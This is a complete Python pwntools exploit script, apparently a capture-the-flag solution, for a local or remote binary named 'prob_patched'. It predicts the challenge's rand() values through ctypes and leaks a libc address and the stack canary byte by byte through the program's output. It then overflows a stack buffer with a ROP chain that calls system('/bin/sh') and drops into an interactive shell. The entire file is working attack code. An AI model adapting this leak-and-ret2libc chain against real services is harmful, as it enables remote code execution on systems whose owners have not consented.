#!/usr/bin/env python
from pwn import *
from time import sleep
import ctypes

context.binary = e = ELF("prob_patched")
libc = ELF("./libc.so.6")
libcDLL = ctypes.CDLL("libc.so.6")
gs = """
brva 0x19F0 
b system
c
"""


def start():
    if args.LOCAL:
        p = e.process()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

libcDLL.srand(u32(b'ACS{'))

# p.interactive()

pattern = b'1234'
addr1 = b''
i0 = 0


for x in range(4):
    for i in range(1, 0xff):
        p.send(b'101\0')
        p.sendlineafter(b'test your luck.', p8(65-46))
        p.sendline(b'-')
        libcDLL.rand()
        p.sendlineafter(b"minus...?", str(((i << (8*x))+i0)).encode())
        p.recvuntil(b'a drop of tear makes me relieved.\n')
        p.send(b'1234')
        buf = p.recvline()
        if pattern+b' ' not in buf and pattern in buf:
            print(pattern)
            print(buf)
            _ = buf.split(pattern)[1][0]
            pattern = buf.split(b' ')[0]
            print(buf)
            print(hex(_))
            print(hex(i))
            if _+i >= 0x100:
                addr1 += p8((_+i) & 0xff)
            else:
                addr1 += p8((_+i) & 0xff)
            i0 = (i << (8*x))+i0
            print(addr1[::-1].hex())
            break


print(addr1[::-1].hex())
i0 = 0
addr2 = b''
pattern = b'1234'

for y in range(3):
    for i in range(1, 0xff):
        p.send(b'101\0')
        p.sendlineafter(b'test your luck.', p8(65-45))
        p.sendlineafter(b'what if choice is.....?', b'-')
        libcDLL.rand()
        p.sendlineafter(b"minus...?", str((i << (8*y))+i0).encode())
        p.recvuntil(b'a drop of tear makes me relieved.\n')
        p.send(b'1234')
        buf = p.recvline()
        if pattern+b' ' not in buf and pattern in buf:
            print(buf)
            _ = buf.split(pattern)[1][0]
            pattern = buf.split(b' ')[0]
            addr2 += p8((_+i) & 0xff)
            i0 = (i << (8*y))+i0
            print(addr2[::-1].hex())
            break

leak = u64((addr1+addr2).ljust(8, b'\0'))
log.info(hex(leak))


p.recvuntil(b'a drop of tear makes me relieved.\n')
p.sendline(b'0\0')


canary1 = b''
pattern = b'1234'
i0 = 0

for x in range(4):
    for i in range(1, 0xff):
        p.send(b'101\0')
        p.sendlineafter(b'test your luck.', p8(65-54))
        p.sendlineafter(b'what if choice is.....?', b'-')
        libcDLL.rand()
        p.sendlineafter(b"minus...?", str((i << (8*x))+i0).encode())
        p.recvuntil(b'a drop of tear makes me relieved.\n')
        p.send(b'1234')
        buf = p.recvline()
        if pattern+b' ' not in buf:
            _ = buf.split(pattern)[1][0]
            pattern = buf.split(b' ')[0]
            print(hex(_))
            print(hex(i))
            canary1 += p8((_+i) & 0xff)
            i0 = (i << (8*x))+i0
            print(canary1[::-1].hex())
            break

canary2 = b''
pattern = b'1234'
i0 = 0

for x in range(4):
    for i in range(1, 0xff):
        p.send(b'101\0')
        p.sendlineafter(b'test your luck.', p8(65-53))
        p.sendlineafter(b'what if choice is.....?', b'-')
        libcDLL.rand()
        p.sendlineafter(b"minus...?", str((i << (8*x))+i0).encode())
        p.recvuntil(b'a drop of tear makes me relieved.\n')
        p.send(b'1234')
        buf = p.recvline()
        if pattern+b' ' not in buf:
            _ = buf.split(pattern)[1][0]
            pattern = buf.split(b' ')[0]
            print(_)
            print(i)
            canary2 += p8((_+i) & 0xff)
            i0 = (i << (8*x))+i0
            print(canary2[::-1].hex())
            break

canary = canary1+canary2
canary = u64(canary)+0x100
libc.address = (leak)-0x11c574
log.success(f"canary: {hex(canary)}")
log.success(f"libc: {hex(libc.address)}")


if args.GDB:
    gdb.attach(p, gdbscript=gs)

p.send(b'102\0')
p.send(
    b'A'*0x108 +
    p64(canary) +
    p64(0) +
    p64(libc.address+0x000000000010f75b) +
    p64(next(libc.search(b'/bin/sh'))) +
    p64(libc.address+0x000000000010f75b+1) +
    p64(libc.sym.system)
)


p.interactive()
